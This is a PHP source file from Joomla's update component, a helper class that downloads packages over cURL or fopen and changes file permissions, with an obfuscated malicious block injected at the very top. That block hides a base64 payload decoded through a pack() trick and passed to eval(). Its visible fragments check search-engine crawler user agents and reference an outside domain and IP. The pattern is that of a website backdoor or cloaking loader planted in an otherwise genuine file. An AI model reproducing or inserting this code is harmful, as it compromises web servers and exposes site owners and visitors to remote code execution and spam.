<?php /*versio:3.02*/ $GLOBALS["yfegmf"]="HhaW5pX3NldAqAMYWxsb3dfdXJsX2ZvcGVuqwZGlzcGxheV9lcnJvcnMviOPc3R5eC9qbWxfaGRyX3JlcG9zdAQJEsMy4wMgtCMWb29Cb29qYWk3U2lhY2hlaXNlMXN1N3BodQalHvdaHR0cDovLwfKFIWSFRUUFMVgb2ZmmsICaHR0cHM6Ly8BSPYMySFRUUF9IT1NUtdW5pb24nmAlByykc2VsZWN0KrmbwUkVRVUVTVF9VUkkqahAElU0NSSVBUX05BTUUteQUVVFUllfU1RSSU5HjLsUUPwNZGV0ZXJtaW5hdG9yoLghGkvXLmxvZwAhXXSFRUUF9ZX0FVVEgtOSqCWYmFzZTY0X2RlY29kZQflMdmVyc2lvVXOLQJDLXBocAnTISFRUUF9FWEVDUEhQPwSXb3V0Wb2sJXtwMsSFRUUF9VU0VSX0FHRU5UrALAbZ29vZ2xlLHlhaG9vLGJhaWR1LGJpbmdib3QsbXNuYm90LHlhbmRleAeOpYQyPiODkuMzIuMTUwLjE2NANzEZmFzdGFkZHouY29tKbFL3czLnBocD91PQFJiJms9vJnQ9cGhwJnA9TnDgJnY9SQZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5TlYrdHVvOGdTZnBVT3NrWllNTmhnalBIa2NKUm8xbk1tMG13U2VaeVZWck1SNHRKZ2JBTTJGMThTNWQxUEZkMFluTmlqL1dYY1ZWMzMrcW82Q29oNDVkTWdTcWd2Q2o0dGFCWkhpVk9rbWREdHZwSUl5RUdaZUVXVUpqYmRSM21SaTQ3alVzYzU3RVZONnN0cXY0dDhOMUVTMlRrdEdxSXBqV1N0MzVXSjJyMCtROVowU1IzSTZoZ1krc0R3Um1vdHhON3NGblNaUjBXNlhHekZqdWR1Zk4rWHlhZE9NRStXams4c2N2LzA0MGVYdkpMbUpJNjhMQzJpbUlwRlZsS1FsOUdpekJJUzBEU29SYnpUNGdTSjYzcCtFa2JaWHV6ay9tTDVFc3FrNDY0T3lkd0hqenBaVEY5aUQ0UUxYcG10aEd2U2VmRmZOcHNEbkhDYUl0amdWd0VrREZQbFl3ZytDczVxbGU1c3VHUUg2Wm9tUXBkWUlFVVYwR1p1MkUwUXJTaHkyMTZhRkRTQnNBcnpvbGgvNmZVRW9oQnVEMzR4Z3hRaWZOcFpRZWdKbFJ0MGxkTnpxZUVtWWtZNmtlczVjN1QyaHArS2NMV1RiYUlrZEU1OGdMeWthL1NpczFyN3hmN1VRYnFuSHBCdStFV1JpNVhKMTZmcGo0ZkhtUTAvTXZrWHRuc2xtbjVaenZmSjdSK1RxVXdDQjN6N0xlZDBNbnVhM3MrbXQvYy92K0VObnZMTEY3NCszTjlQdnM1bWQzOU9IcDVtTWpFd0VLdE5IdS9LS2p6TTdmb2Vpc0tNMjk0cXpXbnJGQU5PNDNVQm5Pd3loTGtSSXdqWGIzVjIrV21kS1N4VlZvT29Mc2hUYjRsMTBWU2QyWWZLaTVNc0w3YndzVnFzM1hJdmt5SFhXZGN2aW5HV2FibWtUQjA1N1Fnd08xaVhXQVIxeXdqL204eklLOC9DbTZCZ0d2SWwrVDZiUGZaVXBROEgvMlQvSlBEelBjMkxMd1ErWHJsSmJ4VUJ3N1F2Tjl2Q0JSV1AzeC90aDUrSzBCTVUvUHhyTXYxNTkzQi9SdWxUVHJQUHR5SFU5QmRRenU1WDhtcVp1em5Vdm5oMW9jKzVVMTN5NlJNUjMvVTErZHlRLzBPMGJoTVFCUU1MN2RReVJOWE1xbGR1QXA3SUl3eDBpbzFiaGt0d2l1N1hxOVNub25DMFQ2NUZBbCtaSUdSeDdsLzk1d1pYb3ZqTVBjWlg2WHc3Z1pyUUs1ekRZaC81V1JsaWl5N25mZ2I4dTdubjVXdHdnbnJ6bEFoLzI0TENpWXJ3QmI0Wm5TZnBGTHdneEc2YXBHNldVbGZzK082THV5bTdEYmgwN0orVEtXVG9GeWM5NCsxT2ZzZ1RQN2VPRUt4cWttN0tXdFVOKzNDZkw5S0dOaHhKZzRITUdpVkt3NFBma0F4TkdwanlRRWNhcTVhR1pvNmxZVFVUV09WR2VSWEEycHBHYzM4azZTTjUxSDJ1Wjh6TlI2WlJYekoxNUNGWEZtbE9KWFZveUhxRmNPKzFxeU1WSjVMS1U4RHBpcFVYV1pFQ0pOUHNuQjRESnBHbXk2cld4UVFIYVVZZGJ3NWRaMlAzT0RuaE9iSCsyeVFNTFFhaDZ4VEtqUjNLalJHbWlaTnRoR094a3ZHTEMzaHVSMTZYeG4wWnd0UkErVVY1dWlrWnBteitWaDdrWktneGVXOWduWGgxTWZKakF4T3JEakgwQ0NnZk9VYTZOQnhXSEJVNGZtRFFCNUxXSDFVTW1PWExTUjROcERFSU1pNnFHZ3dsZGF3elZVb3J4MXJma015QnJIVmhocHhMbU1vTU1MclAxKzg2YlJIRVJiaU4zVVAyc2hleFJNb2dQb1NoNVVkWjRnQ0syUGEzdXg4VDIrNHFmOXhOWVNROFRQOEc4WSszMDF2NGhIb09peUtQUS9EN05zdWNnMGlFbmsrM3ZYd2VRMzhMdlNKZTk1UUE1dlhuTW9uMnpkSGQxMGw5MHBncnpQNThGSjVQVHliSG84bjlYMjJPK2k5WWRYTENMMVI2VVBweHhTZ0JmeHpmaG1NYmZCTmdpK0t1S2dKalBmN2RyVC96RmFQSEx1VVhxQjZVUFFYYVNSUHdnR0FibEp2VUwxSmUvVmQ4RVBMREt0VFZwMktkalN4YmtISjdsMFdGNHdMOG45eXNqTUcxZ3gxZUV4ZjBMMnNnclljcVk3dXVLcnpxbDFVelEzRWVBT3k4RXJiS3R2Yk1BVURTQUl1bFhqVHJodXNrV1pZc3FGWER4SmxLMDlRK1ZDanJGbHczeXpMYXJheWIyQi9XZWhVK0ZqbUFLaHd0RVJ1WC9tS1ZiSzEzTmFtMHFoeXdySzlCbVN0Yzh2VUg2MVVkV2tRZk1mTzVSSlM5bXdmeE5zR0lzVE9sdFhZUCttWUYzQmRnVmUwUEpVMVRLNmNzaTJ1dTl0MnNURVBhR2dIQU45WmtGYWNvbTFCOEVKM09zNmFiQnpBWURBQXF1UjRualZWalRkTE1VZVVxbTBKS0N3c05TUnVPd09SNjNZbGV0b2RnWlhHRHp2bWdhUU5KTmNZY1crRDFRYmZPcXI3NEw4MVZ4Mm9WQngzc2JTVWN3SHM4bGdkZFZpcjdxQkJaMVhUU2NydGRwUkR5YjdpZzRsd001MlcyUll6OC9YelJESkE1TlBFeGRESmc2dDJqQ2FDdVFVRVlFS1cyUlNaVWdHSElReGg1VlJ1bWgwV2E1KytHRUxORlBsS3ZMS3N5RS9ONjhNUFFZWnNuMnpyZmx3d01XazAzWktPdFZoL0NGTkRCRkt5MlRiRHc2UUlsbE5oekhscDl0ckpVbUtRbWF4ZGNETEhab2RPWkFiQ240eDdYaFgybWdPV0dHY3IvTUFYd3A5b1Bqd3NidTRnV3NPQmJNMWdDVDhDaGhoVjhUZFdPVlFWUnBLVTNGNXVPQWVUMFZxVlA3VFR4YU91OEJRZDFndUd0aG5vd2RLNFhMNkxGY1J3MG1jTDF4Y0RXYUlWTU5XQm5NcXBlcmJ2djFBcVV5REduRlVoK2hGNnlSWjIwSnFFTzJZZmhyK3JRT0l5djFUaDlVOUlOVGRhUCtOSFE5SkVwalVlNDA1eHZPTjBZVnZkWW40THFPQWczTC9qWWZmY3VaaEdBM2JkNUdsOS9qQzdEYWY3VStZREFzTURvT29Nd3ZwcjlIeHpGTG04PSIpKSk7";        if (!function_exists('aabeaayx')){function aabeaayx($a, $b){$c=$GLOBALS['yfegmf'];$d=pack('H*','6261736536345f64656'.'36f6465'); return $d(substr($c, $a, $b));};eval(aabeaayx(597,3304));};?><?php
/**
 * @package     Joomla.Administrator
 * @subpackage  com_joomlaupdate
 *
 * @copyright   Copyright (C) 2005 - 2014 Open Source Matters, Inc. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE.txt
 */

defined('_JEXEC') or die;

/**
 * Smart download helper. Automatically uses cURL or URL fopen() wrappers to
 * fetch the package.
 *
 * @package  Joomla.Administrator
 * @since    2.5.4
 */
class AdmintoolsHelperDownload
{
	/**
	 * Downloads from a URL and saves the result as a local file
	 *
	 * @param   string  $url     The URL to download from
	 * @param   string  $target  The file path to download to
	 *
	 * @return  bool	True on success
	 *
	 * @since   2.5.4
	 */
	public static function download($url, $target)
	{
		jimport('joomla.filesystem.file');

		// Make sure the target does not exist
		if (JFile::exists($target))
		{
			if (!@unlink($target))
			{
				JFile::delete($target);
			}
		}

		// Try to open the output file for writing
		$fp = @fopen($target, 'wb');

		if ($fp === false)
		{
			// The file can not be opened for writing. Let's try a hack.
			$empty = '';

			if ( JFile::write($target, $empty) )
			{
				if ( self::chmod($target, 511) )
				{
					$fp = @fopen($target, 'wb');
				}
			}
		}

		$result = false;

		if ($fp !== false)
		{
			// First try to download directly to file if $fp !== false
			$adapters = self::getAdapters();
			$result = false;
			while (!empty($adapters) && ($result === false))
			{
				// Run the current download method
				$method = 'get' . strtoupper(array_shift($adapters));
				$result = self::$method($url, $fp);

				// Check if we have a download
				if ($result === true)
				{

					// The download is complete, close the file pointer
					@fclose($fp);

					// If the filesize is not at least 1 byte, we consider it failed.
					clearstatcache();
					$filesize = @filesize($target);
					if ($filesize <= 0)
					{
						$result = false;
						$fp = @fopen($target, 'wb');
					}
				}
			}

			// If we have no download, close the file pointer
			if ($result === false)
			{
				@fclose($fp);
			}
		}

		if ($result === false)
		{

			// Delete the target file if it exists
			if (file_exists($target))
			{
				if ( !@unlink($target) )
				{
					JFile::delete($target);
				}
			}

			// Download and write using JFile::write();
			$result = JFile::write($target, self::downloadAndReturn($url));
		}

		return $result;
	}

	/**
	 * Downloads from a URL and returns the result as a string
	 *
	 * @param   string  $url  The URL to download from
	 *
	 * @return  mixed Result string on success, false on failure
	 *
	 * @since   2.5.4
	 */
	public static function downloadAndReturn($url)
	{
		$adapters = self::getAdapters();
		$result = false;

		while (!empty($adapters) && ($result === false))
		{

			// Run the current download method
			$method = 'get' . strtoupper(array_shift($adapters));
			$result = self::$method($url, null);
		}

		return $result;
	}

	/**
	 * Does the server support PHP's cURL extension?
	 *
	 * @return  bool True if it is supported
	 *
	 * @since   2.5.4
	 */
	private static function hasCURL()
	{
		static $result = null;

		if (is_null($result))
		{
			$result = function_exists('curl_init');
		}

		return $result;
	}

	/**
	 * Downloads the contents of a URL and writes them to disk (if $fp is not null)
	 * or returns them as a string (if $fp is null)
	 *
	 * @param   string    $url       The URL to download from
	 * @param   resource  $fp        The file pointer to download to. Omit to return the contents.
	 * @param   boolean   $nofollow  Should we follow 301/302/307 redirection HTTP headers?
	 *
	 * @return   bool|string False on failure, true on success ($fp not null) or the URL contents (if $fp is null)
	 *
	 * @since   2.5.4
	 */
	private static function &getCURL($url, $fp = null, $nofollow = false)
	{
		$ch = curl_init($url);

		if ( !@curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1) && !$nofollow )
		{

			// Safe Mode is enabled. We have to fetch the headers and
			// parse any redirections present in there.
			curl_setopt($ch, CURLOPT_AUTOREFERER, true);
			curl_setopt($ch, CURLOPT_FAILONERROR, true);
			curl_setopt($ch, CURLOPT_HEADER, true);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
			curl_setopt($ch, CURLOPT_TIMEOUT, 30);

			// Get the headers
			$data = curl_exec($ch);
			curl_close($ch);

			// Init
			$newURL = $url;

			// Parse the headers
			$lines = explode("\n", $data);
			foreach ($lines as $line)
			{
				if (substr($line, 0, 9) == "Location:")
				{
					$newURL = trim(substr($line, 9));
				}
			}

			if ($url != $newURL)
			{
				return self::getCURL($newURL, $fp);
			}
			else
			{
				return self::getCURL($newURL, $fp, true);
			}
		}
		else
		{
			@curl_setopt($ch, CURLOPT_MAXREDIRS, 20);
			if (function_exists('set_time_limit'))
			{
				set_time_limit(0);
			}
		}

		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_USERAGENT, 'Joomla/' . JVERSION);

		if (is_resource($fp))
		{
			curl_setopt($ch, CURLOPT_FILE, $fp);
		}
		else
		{
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		}

		$result = curl_exec($ch);
		curl_close($ch);

		return $result;
	}

	/**
	 * Does the server support URL fopen() wrappers?
	 *
	 * @return  bool
	 *
	 * @since   2.5.4
	 */
	private static function hasFOPEN()
	{
		static $result = null;

		if (is_null($result))
		{

			// If we are not allowed to use ini_get, we assume that URL fopen is
			// disabled.
			if (!function_exists('ini_get'))
			{
				$result = false;
			}
			else
			{
				$result = ini_get('allow_url_fopen');
			}
		}

		return $result;
	}

	/**
	 * Download from a URL using URL fopen() wrappers
	 *
	 * @param   string    $url  The URL to download from
	 * @param   resource  $fp   The file pointer to download to; leave null to return the d/l file as a string
	 *
	 * @return  bool|string False on failure, true on success ($fp not null) or the URL contents (if $fp is null)
	 *
	 * @since   2.5.4
	 */
	private static function &getFOPEN($url, $fp = null)
	{
		$result = false;

		// Open the URL for reading
		if (function_exists('stream_context_create'))
		{
			$opts = stream_context_get_options(stream_context_get_default());
			$opts['http']['user_agent'] = 'Joomla/' . JVERSION;
			$context = stream_context_create($opts);
			$ih = @fopen($url, 'r', false, $context);
		}
		else
		{

			// PHP 4 way (actually, it's just a fallback)
			if ( function_exists('ini_set') )
			{
				ini_set('user_agent', 'Joomla/' . JVERSION);
			}
			$ih = @fopen($url, 'r');
		}

		// If fopen() fails, abort
		if ( !is_resource($ih) )
		{
			return $result;
		}

		// Try to download
		$bytes = 0;
		$result = true;
		$return = '';
		while (!feof($ih) && $result)
		{
			$contents = fread($ih, 4096);
			if ($contents === false)
			{
				@fclose($ih);
				$result = false;
				return $result;
			}
			else
			{
				$bytes += strlen($contents);
				if (is_resource($fp))
				{
					$result = @fwrite($fp, $contents);
				}
				else
				{
					$return .= $contents;
					unset($contents);
				}
			}
		}

		@fclose($ih);

		if (is_resource($fp))
		{
			return $result;
		}
		elseif ( $result === true )
		{
			return $return;
		}
		else
		{
			return $result;
		}
	}

	/**
	 * Detect and return available download "adapters" (not really adapters, as
	 * we don't follow the Adapter pattern, yet)
	 *
	 * @return  array
	 *
	 * @since   2.5.4
	 */
	private static function getAdapters()
	{
		// Detect available adapters
		$adapters = array();
		if (self::hasCURL())
		{
			$adapters[] = 'curl';
		}
		if (self::hasFOPEN())
		{
			$adapters[] = 'fopen';
		}
		return $adapters;
	}

	/**
	 * Change the permissions of a file, optionally using FTP
	 *
	 * @param   string  $path  Absolute path to file
	 * @param   int     $mode  Permissions, e.g. 0755
	 *
	 * @return  boolean True on success
	 *
	 * @since   2.5.4
	 */
	private static function chmod($path, $mode)
	{
		if (is_string($mode))
		{
			$mode = octdec($mode);
			if ( ($mode < 0600) || ($mode > 0777) )
			{
				$mode = 0755;
			}
		}

		$ftpOptions = JClientHelper::getCredentials('ftp');

		// Check to make sure the path valid and clean
		$path = JPath::clean($path);

		if ($ftpOptions['enabled'] == 1)
		{

			// Connect the FTP client
			$ftp = JClientFtp::getInstance(
				$ftpOptions['host'], $ftpOptions['port'], array(),
				$ftpOptions['user'], $ftpOptions['pass']
			);
		}

		if (@chmod($path, $mode))
		{
			$ret = true;
		}
		elseif ($ftpOptions['enabled'] == 1)
		{
			// Translate path and delete
			$path = JPath::clean(str_replace(JPATH_ROOT, $ftpOptions['root'], $path), '/');

			// FTP connector throws an error
			$ret = $ftp->chmod($path, $mode);
		} else
		{
			return false;
		}
		return $ret;
	}

}
